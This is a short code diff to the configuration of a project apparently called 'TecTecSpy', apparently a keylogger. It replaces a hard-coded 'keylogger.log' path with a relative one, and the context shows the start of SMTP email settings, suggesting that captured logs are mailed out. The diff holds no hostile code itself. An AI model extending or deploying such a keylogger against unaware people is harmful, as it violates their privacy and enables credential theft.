@@ -1,4 +1,8 @@
-LOG_FILE_PATH = "/var/www/html/projects/TecTecSpy/logs/keylogger.log"
+import os
+
+# Diretório de logs será definido de forma relativa
+project_root = os.path.dirname(os.path.abspath(__file__))
+LOG_FILE_PATH = os.path.join(project_root, 'logs', 'keylogger.log')
 
 # Configurações de email
 SMTP_SERVER = "smtp.example.com"
